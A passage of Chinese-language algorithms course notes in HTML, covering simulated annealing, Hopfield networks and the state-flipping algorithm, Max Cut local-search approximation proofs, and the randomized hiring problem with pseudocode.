</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#note-ads-wk11-__codelineno-1-7"></a><span class="w">        </span><span class="n">CurrentCost</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cost</span><span class="p">(</span><span class="n">S</span><span class="err">’</span><span class="p">);</span>
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#note-ads-wk11-__codelineno-1-8"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">CurrentCost</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">MinCost</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#note-ads-wk11-__codelineno-1-9"></a><span class="w">            </span><span class="n">MinCost</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CurrentCost</span><span class="p">;</span><span class="w">    </span><span class="n">S</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">S</span><span class="err">’</span><span class="p">;</span>
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#note-ads-wk11-__codelineno-1-10"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#note-ads-wk11-__codelineno-1-11"></a><span class="w">        </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#note-ads-wk11-__codelineno-1-12"></a><span class="w">            </span><span class="n">With</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">probability</span><span class="p">,</span><span class="w"> </span><span class="n">let</span><span class="w"> </span><span class="n">S</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">S</span><span class="err">’</span><span class="p">;</span>
</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#note-ads-wk11-__codelineno-1-13"></a><span class="w">            </span><span class="k">else</span><span class="w">  </span><span class="k">break</span><span class="p">;</span>
</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#note-ads-wk11-__codelineno-1-14"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#note-ads-wk11-__codelineno-1-15"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#note-ads-wk11-__codelineno-1-16"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">S</span><span class="p">;</span>
</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#note-ads-wk11-__codelineno-1-17"></a><span class="p">}</span>
</span></code></pre></div>
<h2 id="note-ads-wk11-_6">模拟退火<a class="headerlink" href="#note-ads-wk11-_6" title="Permanent link">&para;</a></h2>
<div class="admonition info">
<p class="admonition-title">Info</p>
<p>这种改进的方法由Metropolis，Rosenbluth，Rosenbluth，Teller和Teller于1953年提出，被称为Metropolis算法。他们希望利用统计力学中的原理模拟物理系统的行为。在统计物理中有一个假设，当一个系统的能量为E时，它出现的概率为<span class="arithmatex">\(e^{−E/kT}\)</span>，其中<span class="arithmatex">\(T&gt;0\)</span>是温度，<span class="arithmatex">\(k\)</span>是玻尔兹曼常数。这个假设被称为Boltzmann分布。显然的，当<span class="arithmatex">\(T\)</span>固定时，能量越低的状态出现的概率越大，因此一个物理系统也有更大的概率处于能量低的状态。然后我们考虑温度T的影响，当<span class="arithmatex">\(T\)</span>很大时，根据指数函数的特点，不同能量对应的概率其实差别可能不是很大；但<span class="arithmatex">\(T\)</span>较低的时候，不同的能量对应的概率差别就会很大。</p>
</div>
<p>基于玻尔兹曼分布，我们可以将Metropolis算法描述如下：</p>
<ul>
<li>
<p>初始化：随机选择一个可行解 <span class="arithmatex">\(S\)</span>，设 <span class="arithmatex">\(S\)</span> 的能量为 <span class="arithmatex">\(E(S)\)</span>，并确定一个温度 <span class="arithmatex">\(T\)</span>；</p>
</li>
<li>
<p>不断进行如下步骤：</p>
</li>
</ul>
<p>(1) 随机选择 <span class="arithmatex">\(S\)</span> 的一个邻居 <span class="arithmatex">\(S'\)</span>（可以按均匀分布随机选择）；</p>
<p>(2) 如果 <span class="arithmatex">\(E(S') \leqslant E(S)\)</span>，则接受 <span class="arithmatex">\(S'\)</span> 作为新的解；</p>
<p>(3) 如果 <span class="arithmatex">\(E(S') &gt; E(S)\)</span>，则以概率 <span class="arithmatex">\(e^{-(E(S')-E(S))/kT}\)</span> 接受 <span class="arithmatex">\(S′\)</span> 作为新的解；如果接受了则更新解，继续下一轮迭代，否则保持原解 <span class="arithmatex">\(S\)</span>，继续迭代。</p>
<p>直观地说，Metropolis算法就是在当前解S的邻居中随机选择一个解S′，如果S′的能量更低则接受，否则以一定概率接受一个更差的解——这就使得我们有可能跳出一个局部最优解。当然有一个注意的问题是，我们上面没有写算法的停止点，实际上进行到一个满意的结果中断算法即可。Metropolis等人证明了他们的算法具有如下性质</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>设 <span class="arithmatex">\(Z = \sum_{S } e^{−E(S)/kT}\)</span>，则对于任意状态 <span class="arithmatex">\(S\)</span>，记<span class="arithmatex">\(f_S(t)\)</span>为在<span class="arithmatex">\(t\)</span>轮迭代中选到了状态<span class="arithmatex">\(S\)</span>的比例，则当<span class="arithmatex">\(t \to \infty\)</span>时，<span class="arithmatex">\(f_S(t) \text{(以概率1收敛)} \to e^{−E(S)/kT}/Z\)</span>。</p>
</div>
<h2 id="note-ads-wk11-hopfield">Hopfield 神经网络<a class="headerlink" href="#note-ads-wk11-hopfield" title="Permanent link">&para;</a></h2>
<p>Hopfield神经网络是一种全连接的反馈神经网络，于1982年由J.Hopfeld教授提出;Hopfield神经网络有一个能量函数，如果能将能量函数与一个优化问题绑定，那么Hopfield神经网络就可以用来解决这个优化问题，例如旅行商问题</p>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<ol>
<li>
<p>Hopfield 神经网络可以抽象为一个无向图 <span class="arithmatex">\( G = (V, E) \)</span>，其中 <span class="arithmatex">\( V \)</span> 是神经元的集合，<span class="arithmatex">\( E \)</span> 是神经元之间的连接关系，并且每条边 <span class="arithmatex">\( e \)</span> 都有一个权重 <span class="arithmatex">\( w_e \)</span>，这可能是正数或负数：</p>
</li>
<li>
<p>Hopfield 神经网络的一个状态 (configuration) 是指网络中每个神经元 (即图的顶点) 的状态的一个取值，倾向值能为 1 或 -1。我们记顶点u的状态为 <span class="arithmatex">\( s_u \)</span>。</p>
</li>
<li>
<p>如果对于边 <span class="arithmatex">\( e = (u, v) \)</span>，我们定义 <span class="arithmatex">\( c_e = w_e s_u s_v \)</span>，我们希望<span class="arithmatex">\(c_e &lt; 0\)</span></p>
</li>
<li>
<p>我们将上述条件的边称为“好”的 (good)，而称为“坏”的 (bad)。</p>
</li>
<li>
<p>如果我们一点是“满意的” (satisfied)，当且仅当它所连接的所有点中，好边的权重绝对值大于等于坏边的，即</p>
</li>
</ol>
<div class="arithmatex">\[
\sum_{(u,v) \in E} w_{e(u,v)} s_v s_u &lt; 0,
\]</div>
<p>反之，如果不满足这一条件，我们称其为“不满意的” (unsatisfied)。</p>
<p>6.最后，我们称一个构型是“稳定的（stable）”，当且仅当所有的点都是满意的</p>
<p><div align="center"><img src="../NOTE/ADS/image-14.png" width="50%"></div></p>
</div>
<h3 id="note-ads-wk11-_7">局部搜索算法<a class="headerlink" href="#note-ads-wk11-_7" title="Permanent link">&para;</a></h3>
<p>如果要设计一个局部搜索算法，我想我们有一个非常简单直接的方式。在这一问题中，我们自然地就会定义一个构型的邻居就是将其中一个点的状态取反得到的新构型，然后我们就可以设计一个局部搜索算法了：我们从一个随机初始构型开始，然后检查每个点是否满意，如果有不满意的点，我们就翻转这个点的状态（那么这个点自然就变得满意了），然后继续检查，直到所有的点都满意为止。 <strong>如果这个算法会停止</strong> ，那么停止的时候我们得到的就是一个稳定构型：因为所有点都满意了;</p>
<p>我们称为状态翻转算法（State flipping algorithm）：</p>
<div class="language-cpp highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-ads-wk11-__codelineno-2-1"></a><span class="n">ConfigType</span><span class="w"> </span><span class="nf">State_flipping</span><span class="p">()</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#note-ads-wk11-__codelineno-2-2"></a><span class="p">{</span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#note-ads-wk11-__codelineno-2-3"></a><span class="w">    </span><span class="n">Start</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">arbitrary</span><span class="w"> </span><span class="n">configuration</span><span class="w"> </span><span class="n">S</span><span class="p">;</span>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#note-ads-wk11-__codelineno-2-4"></a><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="o">!</span><span class="w"> </span><span class="n">IsStable</span><span class="p">(</span><span class="n">S</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#note-ads-wk11-__codelineno-2-5"></a><span class="w">        </span><span class="n">u</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GetUnsatisfied</span><span class="p">(</span><span class="n">S</span><span class="p">);</span>
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#note-ads-wk11-__codelineno-2-6"></a><span class="w">        </span><span class="n">su</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">su</span><span class="p">;</span>
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#note-ads-wk11-__codelineno-2-7"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#note-ads-wk11-__codelineno-2-8"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">S</span><span class="p">;</span>
</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#note-ads-wk11-__codelineno-2-9"></a><span class="p">}</span>
</span></code></pre></div>
<div class="admonition idea">
<p class="admonition-title">这个算法一定会停止吗</p>
<p><mark class="critic">
<em>State_flipping算法至多反转<span class="arithmatex">\(\sum_{e \in E}|w_e|\)</span>后会停止</em>
</mark></p>
<p>首先，定义势能函数为一个构型<span class="arithmatex">\(S\)</span>所有好边的权重的绝对值之和</p>
<div class="arithmatex">\[
\Phi(S) = \sum_{e \in E} |w_e| \cdot \mathbb{I}(c_e &lt; 0)
\]</div>
<p>显然，对于任意的构型<span class="arithmatex">\(S\)</span>，<span class="arithmatex">\(\Phi(S) \geqslant 0\)</span>，并且最大值就是所有边的权重绝对值之和。即</p>
<div class="arithmatex">\[
\Phi(S) \leqslant \sum_{e \in E} |w_e|
\]</div>
<p>假设当前状态为<span class="arithmatex">\(S\)</span>,有一个不满意的点<span class="arithmatex">\(u\)</span>，那么我们将<span class="arithmatex">\(u\)</span>的状态取反变为<span class="arithmatex">\(\overline{u}\)</span>，设此时状态为<span class="arithmatex">\(S'\)</span>，那么</p>
<div class="arithmatex">\[
    \Phi(S') - \Phi(S) =  \sum_{e=(u,v),e \in bad} |w_e| - \sum_{e=(u,v),e \in good} |w_e| \geqslant 0
\]</div>
<p>这是因为翻转后原先与 <span class="arithmatex">\(u\)</span> 相连的好边都变成了坏边，坏边都变成了好边，其余边没有变化。又因为 <span class="arithmatex">\(u\)</span> 是不满意的，因此与 <span class="arithmatex">\(u\)</span> 相连的坏边比好边权重绝对值之和大，所以上式大于 0</p>
<p>势能函数只能取整数值，所以 <span class="arithmatex">\(\Phi(S') \geqslant \Phi(S)+1\)</span></p>
<p>这就意味着我们每次翻转一个不满意的点，势能函数就会增加至少 1。因为势能函数的取值范围是有限的（0 到所有边权重绝对值之和），所以我们的局部搜索算法一定会停止;</p>
<p>有推论:</p>
<p>设 <span class="arithmatex">\(S\)</span> 是一个构型，如果 <span class="arithmatex">\(\Phi(S)\)</span> 是局部最大值，则 <span class="arithmatex">\(S\)</span> 是一个稳定构型</p>
<p>证明：如果 <span class="arithmatex">\(S\)</span> 不是一个稳定构型，那么至少有一个点是不满意的，我们可以翻转这个点，势能函数会增加至少 1，这就意味着 <span class="arithmatex">\(\Phi(S)\)</span> 不是局部最大值，矛盾。</p>
</div>
<h2 id="note-ads-wk11-max-cut">最大割问题 (Max Cut)<a class="headerlink" href="#note-ads-wk11-max-cut" title="Permanent link">&para;</a></h2>
<p>最大割问题也是一个经典的 NP 困难问题，在这一问题中，我们希望将一个边权全为正的无向图 <span class="arithmatex">\(G =
(V, E)\)</span> 的顶点集合 <span class="arithmatex">\(V\)</span> 分成两个集合 <span class="arithmatex">\(A\)</span> 和 <span class="arithmatex">\(B\)</span>（这时的解记为 <span class="arithmatex">\((A, B)\)</span>），使得割边的权重和最大，其中割边的含义就是一条边的两个端点分别在 <span class="arithmatex">\(A\)</span> 和 <span class="arithmatex">\(B\)</span> 中，即我们要最大化</p>
<div class="arithmatex">\[
   w(A,B) = \sum_{(u, v) \in E} w_{uv} \cdot \mathbb{I}(u \in A, v \in B)
\]</div>
<div class="admonition note">
<p class="admonition-title">与Hopfield的关联</p>
<p>我们希望给出一个局部搜索解法----这是非常自然的，因为它和 Hopfield 神经网络问题之间有一个很直接的关联。我们有一个很简单的观察，对于任意的解 <span class="arithmatex">\((A, B)\)</span>，然后将 <span class="arithmatex">\(A\)</span> 中的点赋状态<span class="arithmatex">\(-1\)</span>，<span class="arithmatex">\(B\)</span> 中的点赋状态 <span class="arithmatex">\(1\)</span>，因为所有边的权重都是正数，所以最大化割边权重和对应于<span class="arithmatex">\(Hopfield\)</span> 神经网络问题其实就是最大化好边的总权重和 <span class="arithmatex">\(\Phi(S)\)</span>，这就和 Hopfield 神经网络问题一样了,使用State flipping算法即可</p>
</div>
<h3 id="note-ads-wk11-_8">局部算法与最优解的关系<a class="headerlink" href="#note-ads-wk11-_8" title="Permanent link">&para;</a></h3>
<p>在最大割问题中，我们可以证明局部搜索算法的最优解和全局最优解之间的关系：局部搜索算法给出的局部最优解最差也不会低于最优解的一半</p>
<p>即</p>
<p><strong>设 <span class="arithmatex">\((A, B)\)</span> 是如上局部搜索算法得出的一个局部最优解，<span class="arithmatex">\((A^∗, B^∗)\)</span> 是最优解，则</strong></p>
<div class="arithmatex">\[
    w(A, B) \geqslant \frac{1}{2} w(A^∗, B^∗)
\]</div>
<div class="admonition proof">
<p class="admonition-title">Proof</p>
<p>设 <span class="arithmatex">\(u \in A\)</span>,因为<span class="arithmatex">\((A,B)\)</span>是局部最优解，所以，如果将<span class="arithmatex">\(u\)</span>从<span class="arithmatex">\(A\)</span>中移到<span class="arithmatex">\(B\)</span>中，割边权重和会减少；即</p>
<div class="arithmatex">\[
    \sum_{v \in A} w_{uv} \leqslant \sum_{v in B} w_{uv}
\]</div>
<p>对所有的<span class="arithmatex">\(u \in A\)</span>都成立，所以求和得到</p>
<div class="arithmatex">\[
    \sum_{u \in A}\sum_{v \in A} w_{uv} \leqslant \sum_{u \in A}\sum_{v \in B} w_{uv}
\]</div>
<p>等式左边为<span class="arithmatex">\(A\)</span>中所有的边权重和的两倍，右边为<span class="arithmatex">\(A\)</span>和<span class="arithmatex">\(B\)</span>之间的边权重和(所有的割边的权重和)，所以</p>
<div class="arithmatex">\[
    2w(A,A) \leqslant w(A,B)
\]</div>
<p>同理，我们可以得到</p>
<div class="arithmatex">\[
    2w(B,B) \leqslant w(A,B)
\]</div>
<p>我们又知道，总的边权重和为</p>
<div class="arithmatex">\[
    W = w(A,A) + w(B,B) + w(A,B)
\]</div>
<p>所以</p>
<div class="arithmatex">\[
    w(A^*,B^*) \leqslant w(A,B) + w(A,A) + w(B,B) \leqslant 2w(A,B)
\]</div>
</div>
<h3 id="note-ads-wk11-_9">优化<a class="headerlink" href="#note-ads-wk11-_9" title="Permanent link">&para;</a></h3>
<p>事实上在控制迭代次数引起的复杂度时非常常用（这里就是求 <span class="arithmatex">\(\Phi(S)\)</span> 的局部最优值需要的迭代次数可能太多）。我们要求算法在找不到一个能对解有 “比较大的提升” 的时候就停止，即使当时的解不是局部最优解：</p>
<p>当我们处于解 <span class="arithmatex">\(w(A, B)\)</span> 时，我们要求下一个解的权重至少要增大<span class="arithmatex">\(\dfrac{2\varepsilon}{n}w(A, B)\)</span>，其中 <span class="arithmatex">\(n\)</span> 是图 <span class="arithmatex">\(G\)</span> 的顶点数。对于这一算法，我们有如下结论：</p>
<p><strong>设 <span class="arithmatex">\((A, B)\)</span> 是如上局部搜索算法得出的一个解，<span class="arithmatex">\((A^∗, B^∗)\)</span> 是最优解，则</strong></p>
<div class="arithmatex">\[
    w(A, B) \geqslant \frac{1}{2+\varepsilon} w(A^∗, B^∗)
\]</div>
<p>并且这一算法会在 <span class="arithmatex">\(O(\dfrac{n}{\varepsilon} \log W)\)</span> 次状态翻转后停止，其中 <span class="arithmatex">\(W\)</span> 是所有边的权重之和</p>
<div class="admonition proof">
<p class="admonition-title">Proof</p>
<p>对于任意的解 <span class="arithmatex">\((A, B)\)</span>，设<span class="arithmatex">\(u \in A\)</span></p>
<div class="arithmatex">\[
    \sum_{v \in A} w_{uv} \leqslant \sum_{v \in B} w_{uv} + \frac{2\varepsilon}{n} w(A,B)
\]</div>
<p>对所有的<span class="arithmatex">\(u \in A\)</span>都成立，所以求和得到</p>
<div class="arithmatex">\[
    2w(A,A) \leqslant w(A,B) + \frac{2\varepsilon}{n} w(A,B) \cdot n_A
\]</div>
<p>其中 <span class="arithmatex">\(n_A\)</span> 是 <span class="arithmatex">\(A\)</span> 中的点数，同理</p>
<div class="arithmatex">\[
    2w(B,B) \leqslant w(A,B) + \frac{2\varepsilon}{n} w(A,B) \cdot n_B
\]</div>
<p>所以</p>
<div class="arithmatex">\[
    w(A^*,B^*) \leqslant w(A,B) + w(A,A) + w(B,B) \leqslant 2w(A,B) + \varepsilon w(A,B) 
\]</div>
<p>因为我们每次反转会使得割边权重和增加<span class="arithmatex">\(1+\dfrac{\varepsilon}{n}\)</span>倍，所以我们需要<span class="arithmatex">\(O(\dfrac{n}{\varepsilon} \log W)\)</span>次状态翻转后会达到停止条件</p>
</div>
<details class="summary">
<summary>选择更好的邻居</summary>
<p><img alt="alt text" src="../NOTE/ADS/image-15.png" /></p>
</details></section><section class="print-page" id="note-ads-wk12" heading-number="2.2.3.14"><h1 id="note-ads-wk12-_1">随机算法<a class="headerlink" href="#note-ads-wk12-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 1631 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 54 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 6 分钟</p>
</div>
<p>确定性算法是指在给定相同输入的情况下，算法总是产生相同的结果。</p>
<p>随机算法是指在给定相同输入的情况下，算法可能产生不同的结果。</p>
<p>对于一些复杂的计算问题，确定性算法可能需要耗费大量的时间和资源，而随机算法可以在合理的时间内提供一个近似解。例如，蒙特卡罗方法在计算高维积分时表现出色。</p>
<p>在某些情况下，输入数据可能具有不确定性或噪声，随机算法可以更好地处理这些不确定性。例如，随机森林算法在处理有噪声的数据时表现良好。</p>
<p>有些问题的确定性算法设计非常复杂，而随机算法可以提供一种更为简单和直接的解决方案。例如，拉斯维加斯算法在找到正确解之前会不断尝试，设计相对简单。</p>
<p>在分布式计算环境中，随机算法可以有效地分配任务，减少通信开销，提高计算效率。例如，哈希算法在分布式系统中的负载均衡中起到了重要作用。</p>
<p>随机算法分为以下两种</p>
<div class="admonition note">
<p class="admonition-title">随机算法</p>
<ol>
<li>
<p>拉斯维加斯算法(Las Vegas Algorithm): 这种算法在每次运行时都会使用随机性，但它保证最终会找到一个正确的解。也就是说，拉斯维加斯算法的输出总是正确的，但运行时间可能会有所不同。一个典型的例子是快速排序算法的随机化版本，它通过随机选择枢轴来提高平均性能。
(randomized algorithms that are always correct, and run efficiently in expectation)</p>
</li>
<li>
<p>蒙特卡罗算法(Monte Carlo Algorithm): 这种算法在每次运行时都会使用随机性，但它不一定能找到一个正确的解。也就是说，蒙特卡罗算法的输出可能不正确，但运行时间通常是固定的。一个典型的例子是蒙特卡罗方法在计算高维积分时表现出色。(efficient randomized algorithms that only need to yield the correct answer with high probability)</p>
</li>
</ol>
</div>
<h2 id="note-ads-wk12-the-hiring-problem">雇佣问题(The Hiring Problem)<a class="headerlink" href="#note-ads-wk12-the-hiring-problem" title="Permanent link">&para;</a></h2>
<ul>
<li>从猎头公司雇佣一名办公室助理</li>
<li>每天面试不同的申请者，持续 <span class="arithmatex">\(N\)</span> 天</li>
<li>面试成本 <span class="arithmatex">\(C_i\)</span> 远小于 雇佣成本 <span class="arithmatex">\(C_h\)</span></li>
<li>分析面试和雇佣成本而不是运行时间</li>
</ul>
<p>假设雇佣了 <span class="arithmatex">\(M\)</span> 个人。
总成本：<span class="arithmatex">\(O(NC_i + MC_h)\)</span></p>
<p>Naive solution:</p>
<div class="language-cpp highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-ads-wk12-__codelineno-0-1"></a><span class="kt">int</span><span class="w"> </span><span class="nf">Hiring</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">EventType</span><span class="w"> </span><span class="n">C</span><span class="p">[</span><span class="w"> </span><span class="p">],</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">N</span><span class="w"> </span><span class="p">)</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-ads-wk12-__codelineno-0-2"></a><span class="p">{</span><span class="w">   </span><span class="cm">/* candidate 0 is a least-qualified dummy candidate */</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-ads-wk12-__codelineno-0-3"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">Best</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-ads-wk12-__codelineno-0-4"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">BestQ</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">quality</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">candidate</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#note-ads-wk12-__codelineno-0-5"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">&lt;=</span><span class="n">N</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#note-ads-wk12-__codelineno-0-6"></a><span class="w">        </span><span class="n">Qi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">interview</span><span class="p">(</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="p">);</span><span class="w"> </span><span class="cm">/* Ci */</span>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#note-ads-wk12-__codelineno-0-7"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">Qi</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">BestQ</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#note-ads-wk12-__codelineno-0-8"></a><span class="w">            </span><span class="n">BestQ</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Qi</span><span class="p">;</span>
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#note-ads-wk12-__codelineno-0-9"></a><span class="w">            </span><span class="n">Best</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#note-ads-wk12-__codelineno-0-10"></a><span class="w">            </span><span class="n">hire</span><span class="p">(</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="p">);</span><span class="w">  </span><span class="cm">/* Ch */</span>
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#note-ads-wk12-__codelineno-0-11"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#note-ads-wk12-__codelineno-0-12"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#note-ads-wk12-__codelineno-0-13"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">Best</span><span class="p">;</span>
</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#note-ads-wk12-__codelineno-0-14"></a><span class="p">}</span>
</span></code></pre></div>
<p>最坏情况是面试者始终比前一个面试者优秀，那么需要面试 <span class="arithmatex">\(N\)</span> 次，雇佣 <span class="arithmatex">\(N\)</span> 次，总成本为 <span class="arithmatex">\(O(NC_h)\)</span>。</p>
<p>假设<span class="arithmatex">\(N\)</span>个面试者以随机顺序被试，前<span class="arithmatex">\(i\)</span>个候选人中的任何一个都同样有可能是迄今为止最合格的。</p>
<p>即第<span class="arithmatex">\(i\)</span>个人被选中的概率相当于<span class="arithmatex">\(i\)</span>个球的盒子中随机抽取一个球，抽到最好球的概率，为<span class="arithmatex">\(\frac{1}{i}\)</span>。</p>
<p>定义随机变量<span class="arithmatex">\(X_i\)</span></p>
<p>定义随机变量 <span class="arithmatex">\(X_i\)</span> 如下：</p>
<div class="arithmatex">\[
X_i = 
\begin{cases} 
1, &amp; \text{如果第 } i \text{ 个候选人被雇佣} \\
0, &amp; \text{如果第 } i \text{ 个候选人未被雇佣}
\end{cases}
\]</div>
<p>候选人 <span class="arithmatex">\(i\)</span> 被雇佣的概率为 <span class="arithmatex">\(\frac{1}{i}\)</span>。</p>
<p>总的雇佣次数 <span class="arithmatex">\(X\)</span> 为：</p>
<div class="arithmatex">\[
X = \sum_{i=1}^{N} X_i
\]</div>
<p>期望值为：</p>
<div class="arithmatex">\[
E[X_i] = \Pr[\text{候选人 } i \text{ 被雇佣}]
\]</div>
<p>因此，期望总雇佣次数为：</p>
<div class="arithmatex">\[
E[X] = E\left[\sum_{i=1}^{N} X_i\right] = \sum_{i=1}^{N} E[X_i] = \sum_{i=1}^{N} \frac{1}{i} = \ln N + O(1)
\]</div>
<p>总成本为 <span class="arithmatex">\(O(C_h \ln N + NC_i)\)</span>。</p>
